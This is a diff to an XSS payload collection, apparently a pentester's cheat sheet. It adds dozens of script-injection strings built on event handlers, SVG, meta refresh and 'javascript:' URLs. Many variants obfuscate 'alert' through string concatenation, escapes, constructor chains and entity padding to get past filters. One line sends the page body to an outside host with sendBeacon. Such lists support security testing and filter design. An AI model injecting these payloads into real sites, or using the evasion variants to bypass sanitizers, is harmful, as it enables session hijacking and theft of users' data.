@@ -53,6 +53,7 @@
 <svg><animate xlink:href=\"#x\" attributeName=\"href\" values=\"data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x\" /><use id=x />
 <x onbeforescriptexecute=alert(1)><script>1</script>
 <x onafterscriptexecute=alert(1)><script>1</script>
+<script>navigation.navigate('javascript:alert(1)')</script>
 <script>alert(document.domain)<\/script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
@@ -452,6 +453,7 @@ code
 <audio src/onerror=alert(1)>
 <object onerror=alert(1) data=1 type=image/gif>
 <embed src=1 onerror=alert(1) type=image/gif>
+<svg><use href=\"x\" onerror=\"alert(1)\"></use></svg>
 <input autofocus onfocus=alert(1)>
 <select autofocus onfocus=alert(1)>
 <textarea autofocus onfocus=alert(1)>test</textarea>
@@ -745,7 +747,7 @@ code
 <var id=x tabindex=1 onfocusin=alert(1)></var>
 <wbr id=x tabindex=1 onfocusin=alert(1)></wbr>
 <xmp id=x tabindex=1 onfocusin=alert(1)></xmp>
-<xss autofocus tabindex=1 onfocusin=alert(1)></xss>
+<xss tabindex=1 autofocus onfocusin=alert(1)>
 <* onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</*><input value=clickme>
 <body onhashchange=\"print()\">
 <form onformdata=\"alert(1)\"><button>Click</button></form>
@@ -756,13 +758,14 @@ code
 <* onkeydown=\"alert(1)\" contenteditable style=display:block>test</*>
 <* onkeypress=\"alert(1)\" contenteditable style=display:block>test</*>
 <* onkeyup=\"alert(1)\" contenteditable style=display:block>test</*>
-<video onloadstart=\"alert(1)\"><source></*>
+<video onloadstart=\"alert(1)\"><source>
+<audio onloadstart=\"alert(1)\"><source>
 <body onload=alert(1)>
 <script onload=alert(1) src=validjs.js></script>
 <object data=/ onload=alert(1)>
 <style onload=alert(1)></style>
 <svg onload=alert(1)>
-<link href=validstyles.css rel=stylesheet onload=alert(1)>
+<link href=data:, rel=stylesheet onload=alert(1)>
 <iframe onload=alert(1)></iframe>
 <frameset><frame onload=alert(1)>
 <embed src=/ onload=alert(1)>
@@ -774,6 +777,7 @@ code
 <svg><image href=validimage.png onload=alert(1)>
 <input type=image src=validimage.png onload=alert(1)>
 <video><track default onload=alert(1) src=\"data:text/vtt,WEBVTT\"></video>
+<svg><use href=\"/index_files/portswigger-logo.svg\" onload=\"alert(1)\"></use></svg>
 <video onloadeddata=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>
 <audio onloadeddata=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>
 <video autoplay onloadedmetadata=alert(1)> <source src=\"validvideo.mp4\" type=\"video/mp4\"></video>
@@ -964,8 +968,8 @@ code
 <body ontouchend=alert(1)> 
 <body ontouchmove=alert(1)> 
 <style>:target {color: red;}</style><* id=x style=\"transition:color 10s\" ontransitioncancel=print()></*>
-<style>:target {color:red;}</style><* id=x style=\"transition:color 1s\" onwebkittransitionend=alert(1)></*>
-<* id=x style=\"transition:outline 1s\" ontransitionend=alert(1) tabindex=1></*>
+<xss style=transition:1s onwebkittransitionend=alert(1) tabindex=1 autofocus>
+<* autofocus style=transition:1s ontransitionend=alert(1) tabindex=1>
 <style>:target {transform: rotate(180deg);}</style><* id=x style=\"transition:transform 2s\" ontransitionrun=print()></*>
 <body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
 <svg onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>
@@ -1021,7 +1025,9 @@ code
 <button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>
 <input type=range ongotpointercapture=alert(1)>
 <input type=range onlostpointercapture=alert(1)>
-<* id=x onbeforematch=alert(1) hidden=until-found>
+<input type=hidden id=x onbeforematch=alert(1) hidden=until-found>
+<meta name=description content=hello id=x hidden=until-found onbeforematch=alert(1)>
+<meta name=description content=0;#x http-equiv=refresh id=x hidden=until-found onbeforematch=alert(1)>
 x<template shadowrootmode=open><slot onslotchange=alert(1)>
 <geolocation onvalidationstatuschange=alert(1)>
 <usermedia onvalidationstatuschange=alert(1)>
@@ -1070,7 +1076,6 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>
 <object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>
 <object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>
-<script>navigation.navigate('javascript:alert(1)')</script>
 <script>onerror=alert;throw 1</script>
 <script>{onerror=alert}throw 1</script>
 <script>throw onerror=alert,1</script>
@@ -1084,7 +1089,7 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <script>'alert\\x281\\x29'instanceof{[Symbol.hasInstance]:eval}</script>
 <script>'alert\\x281\\x29'instanceof{[Symbol['hasInstance']]:eval}</script>
 <script>location='javascript:alert\\x281\\x29'</script>
-<script>location=name</script>
+<script>window.name='alert(1)';</script><script>location=name</script>
 <script>alert`1`</script>
 <script>new Function`X${document.location.hash.substr`1`}`</script>
 <script>Function`X${document.location.hash.substr`1`}```</script>
@@ -1122,7 +1127,7 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <script>throw onerror=eval,x=new Error,x.message='alert\\x281\\x29',x</script>
 <script>throw onerror=eval,x=new Error,x.name='',x.message='=alert\\x281\\x29',x</script>
 <img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>
-<svg onload=\"attributes[0].value=name,new onload\">
+<script>window.name='alert(1)';</script><svg onload=\"attributes[0].value=name,new onload\">
 <svg onload=\"attributes[0].value=id+URL+id,new onload\" id=`>
 <input onfocus=\"attributes[0].value=id+URL+id,new onfocus\" id=` autofocus>
 <input onclick=attributes[0].value='`'+URL+'`'>
@@ -1130,6 +1135,282 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <svg onload=innerHTML=URL,innerHTML=textContent>
 <img/src/onerror=innerHTML=URL,innerHTML=textContent>
 <svg onload=innerHTML=URL,eval(textContent)>
+<svg onload=outerHTML=id id=<img/src/onerror=alert(1)&gt;
+\u2028alert(1)
+\u2029alert(1)
+'-prompt(1)-'
+'-confirm(1)-'
+'-window['a'+'lert'](1)-'
+'-window[`a`+'lert'](1)-'
+'-\\u0061lert(1)-'
+'-\\u{0061}lert(1)-'
+'-\\u{61}lert(1)-'
+'-\\u{00000000000061}lert(1)-'
+'-self['a'+'lert'](1)-'
+'-self[`${`a`}lert`](1)-'
+'-self['\\a'+'lert'](1)-'
+'-self['\\x61'+'lert'](1)-'
+'-self['\\141'+'lert'](1)-'
+'-self[/a/.source+/lert/.source](1)-'
+'-self[atob.name[0]+'lert'](1)-'
+'-self[atob.name[0]+'lert'](1)-'
+'-self[String.fromCharCode(0x61)+'lert'](1)-'
+'-self[String.fromCodePoint(0x61)+'lert'](1)-'
+'-self[10..toString(17)+'lert'](1)-'
+'-self[10n.toString(17)+'lert'](1)-'
+'-self[0xa.toString(17)+'lert'](1)-'
+'-self[0b1010.toString(17)+'lert'](1)-'
+'-self[0o12.toString(17)+'lert'](1)-'
+'-self[atob('YQ==')+'lert'](1)-'
+'-self[unescape('%61')+'lert'](1)-'
+'-self[decodeURI('%61')+'lert'](1)-'
+'-self[decodeURIComponent('%61')+'lert'](1)-'
+'-self['a'+[]+'lert'](1)-'
+'-frames['a'+'lert'](1)-'
+'-globalThis['a'+'lert'](1)-'
+'-top['a'+'lert'](1)-'
+'-parent['a'+'lert'](1)-'
+'-this['a'+'lert'](1)-'
+'-alert`1`-'
+';throw onerror=alert,1;'
+'\nthrow onerror=alert,1\n'
+'\u2028throw onerror=alert,1\u2028'
+'\u2029throw onerror=alert,1\u2029'
+'-[location=name]-'
+'-[location.href=name]-'
+'-[location='javascript:alert%281%29']-'
+'-[location='javascript:alert\\x281\\x29']-'
+'-[location='javascript:alert\\u00281\\u0029']-'
+'-[location='javascript:alert\\501\\51']-'
+'-['alert\\x281\\x29'instanceof{[Symbol.hasInstance]:eval}]-'
+'-alert(1)-'
+&apos;-alert(1)-&apos;
+&#x27;-alert(1)-&#x27;
+&#39;-alert(1)-&#39;
+&#x27-alert(1)-&#x27
+&#39-alert(1)-&#39
+javaScript:alert(1)
+java\nscript:alert(1)
+java\tscript:alert(1)
+javascript&colon;alert(1)
+javascript&#58;alert(1)
+javascript&#58alert(1)
+javascript&#x3a;alert(1)
+javascript&#x3a-alert(1)
+java&NewLine;script:alert(1)
+java&Tab;script:alert(1)
+java&#x9;script:alert(1)
+java&#x00000000000009;script:alert(1)
+java&#9;script:alert(1)
+java&#00000000000009;script:alert(1)
+java&#x9script:alert(1)
+java&#x00000000000009script:alert(1)
+java&#9script:alert(1)
+java&#00000000000009script:alert(1)
+&NewLine;javascript:alert(1)
+&Tab;javascript:alert(1)
+\njavascript:alert(1)
+%09javascript:alert(1)
+%20javascript:alert(1)
+&#1;javascript:alert(1)
+&#2;javascript:alert(1)
+&#3;javascript:alert(1)
+&#4;javascript:alert(1)
+&#5;javascript:alert(1)
+&#6;javascript:alert(1)
+&#7;javascript:alert(1)
+&#8;javascript:alert(1)
+&#9;javascript:alert(1)
+&#10;javascript:alert(1)
+&#11;javascript:alert(1)
+&#12;javascript:alert(1)
+&#13;javascript:alert(1)
+&#14;javascript:alert(1)
+&#15;javascript:alert(1)
+&#16;javascript:alert(1)
+&#17;javascript:alert(1)
+&#18;javascript:alert(1)
+&#19;javascript:alert(1)
+&#20;javascript:alert(1)
+&#21;javascript:alert(1)
+&#22;javascript:alert(1)
+&#23;javascript:alert(1)
+&#24;javascript:alert(1)
+&#25;javascript:alert(1)
+&#26;javascript:alert(1)
+&#27;javascript:alert(1)
+&#28;javascript:alert(1)
+&#29;javascript:alert(1)
+&#30;javascript:alert(1)
+&#31;javascript:alert(1)
+&#x1;javascript:alert(1)
+&#x2;javascript:alert(1)
+&#x3;javascript:alert(1)
+&#x4;javascript:alert(1)
+&#x5;javascript:alert(1)
+&#x6;javascript:alert(1)
+&#x7;javascript:alert(1)
+&#x8;javascript:alert(1)
+&#x9;javascript:alert(1)
+&#xa;javascript:alert(1)
+&#xb;javascript:alert(1)
+&#xc;javascript:alert(1)
+&#xd;javascript:alert(1)
+&#xe;javascript:alert(1)
+&#xf;javascript:alert(1)
+&#x10;javascript:alert(1)
+&#x11;javascript:alert(1)
+&#x12;javascript:alert(1)
+&#x13;javascript:alert(1)
+&#x14;javascript:alert(1)
+&#x15;javascript:alert(1)
+&#x16;javascript:alert(1)
+&#x17;javascript:alert(1)
+&#x18;javascript:alert(1)
+&#x19;javascript:alert(1)
+&#x1a;javascript:alert(1)
+&#x1b;javascript:alert(1)
+&#x1c;javascript:alert(1)
+&#x1d;javascript:alert(1)
+&#x1e;javascript:alert(1)
+&#x1f;javascript:alert(1)
+'-atob.constructor('a'+'lert(1)')()-'
+'-btob.constructor('a'+'lert(1)')()-'
+'-Ink.constructor('a'+'lert(1)')()-'
+'-HID.constructor('a'+'lert(1)')()-'
+'-GPU.constructor('a'+'lert(1)')()-'
+'-when.constructor('a'+'lert(1)')()-'
+'-find.constructor('a'+'lert(1)')()-'
+'-print.constructor('a'+'lert(1)')()-'
+'-Set.constructor('a'+'lert(1)')()-'
+'-{}.constructor.constructor('a'+'lert(1)')()-'
+'-''.constructor.constructor('a'+'lert(1)')()-'
+'-[].constructor.constructor('a'+'lert(1)')()-'
+'-0..constructor.constructor('a'+'lert(1)')()-'
+'-0n.constructor.constructor('a'+'lert(1)')()-'
+'-[s=document.createElement('script'),s.append('a'+'lert(1)'),document.documentElement.append(s)]-'
+'-location.replace('javascript:a\\lert(1)')-'
+'-[location='javascript:a\\lert(1)']-'
+\"/onfocus=alert(1) tabindex=1 autofocus/
+\"/onfocusin=alert(1) tabindex=1 autofocus/
+\"/onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onmouseenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onpointerenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onpointermove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onpointerover=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onmousedown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onmouseup=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onfocus=alert(1) autofocus/
+\"/onfocusin=alert(1) autofocus/
+\"/onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onmouseenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onpointerenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onpointermove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onpointerover=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onmousedown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onmouseup=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onfocus=alert(1) autofocus/
+1 onfocusin=alert(1) autofocus/
+1 onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onmouseenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onpointerenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onpointermove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onpointerover=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onmouseup=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+\"onfocus=\"alert(1)\"/autofocus/
+\"onfocusin=\"alert(1)\"/autofocus/
+\"onmousemove=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /
+\"onmouseenter=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /
+\"onpointerenter=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /
+\"onpointermove=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /
+\"onpointerover=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /
+\"onpointerrawupdate=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /
+\"onmouseup=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /
+\"onpointerdown=\"alert(1)\"style=\"position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0\" /
+\" srcdoc=\"<xss tabindex=1 autofocus onfocusin=alert(1)>\"
+<xss tabindex=1 autofocus onfocus=atob.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=btob.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=Ink.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=HID.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=GPU.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=when.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=find.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=print.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=Set.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus={}.constructor.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=''.constructor.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=[].constructor.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=0..constructor.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=0n.constructor.constructor('a'+'lert(1)')()>
+<xss tabindex=1 autofocus onfocus=s=createElement('script'),s.append('a'+'lert(1)'),this.append(s)>
+<xss tabindex=1 autofocus onfocus=location.replace('javascript:a\\lert(1)')>
+<xss tabindex=1 autofocus onfocus=location='javascript:a\\lert(1)'>
+<xss tabindex=1 autofocus onfocus=location=self.name>
+<xss tabindex=1 autofocus onfocus=location=frames.name>
+<xss tabindex=1 autofocus onfocus=location=globalThis.name>
+<xss tabindex=1 autofocus onfocus=location=globalThis.name>
+<xss tabindex=1 autofocus onfocus=throw/**/self.onerror=&#97lert,1>
+<xss tabindex=1 autofocus onfocus=throw/**/frames.onerror=&#97lert,1>
+<xss tabindex=1 autofocus onfocus=throw/**/globalThis.onerror=&#97lert,1>
+<xss tabindex=1 autofocus onfocus=\"throw self.onerror=&#97lert,1\">
+<xss tabindex=1 autofocus onfocus=\"throw frames.onerror=&#97lert,1\">
+<xss tabindex=1 autofocus onfocus=\"throw globalThis.onerror=&#97lert,1\">
+<xss tabindex=1 autofocus onfocus=\"throw defaultView.onerror=&#97lert,1\">
+<xss title=aler id=t tabindex=1 autofocus onfocus=\"throw defaultView.onerror=defaultView[title+id],1\">
+<xss title=aler id=t tabindex=1 autofocus onfocus=throw&Tab;defaultView.onerror=defaultView[title+id],1>
+<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32defaultView.onerror=defaultView[title+id],1>
+<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32self.onerror=self[title+id],1>
+<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32globalThis.onerror=globalThis[title+id],1>
+<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32frames.onerror=frames[title+id],1>
+<xss title=java id=script:ale class=rt&lpar;1&rpar; tabindex=1 autofocus onfocus=location=title+id+className>
+<xss title=java id=script:ale class=rt&#40;1&#41; tabindex=1 autofocus onfocus=location=title+id+className>
+<xss title=java id=script:ale class=rt&#x28;1&#x29; tabindex=1 autofocus onfocus=location=title+id+className>
+<xss tabindex=1 autofocus onfocus=window['a'+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=window[`a`+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=\\u0061lert(1)>
+<xss tabindex=1 autofocus onfocus=\\u{0061}lert(1)>
+<xss tabindex=1 autofocus onfocus=\\u{61}lert(1)>
+<xss tabindex=1 autofocus onfocus=\\u{00000000000061}lert(1)>
+<xss tabindex=1 autofocus onfocus=self['a'+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[`${`a`}lert`](1)>
+<xss tabindex=1 autofocus onfocus=self['\\a'+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self['\\x61'+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self['\\141'+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[/a/.source+/lert/.source](1)>
+<xss tabindex=1 autofocus onfocus=self[atob.name[0]+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[atob.name[0]+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[String.fromCharCode(0x61)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[String.fromCodePoint(0x61)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[10..toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[10n.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[0xa.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[0b1010.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[0o12.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[atob('YQ==')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[unescape('%61')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[decodeURI('%61')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self[decodeURIComponent('%61')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=self['a'+[]+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=frames['a'+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[10n.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[0xa.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[0b1010.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[0o12.toString(17)+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[atob('YQ==')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[unescape('%61')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[decodeURI('%61')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView[decodeURIComponent('%61')+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView['a'+[]+'lert'](1)>
+<xss tabindex=1 autofocus onfocus=defaultView['a'+'lert'](1)>
 <meta http-equiv=\"refresh\" content=\"0; url=\/\/portswigger-labs.net\">
 <meta charset=\"UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
 <meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
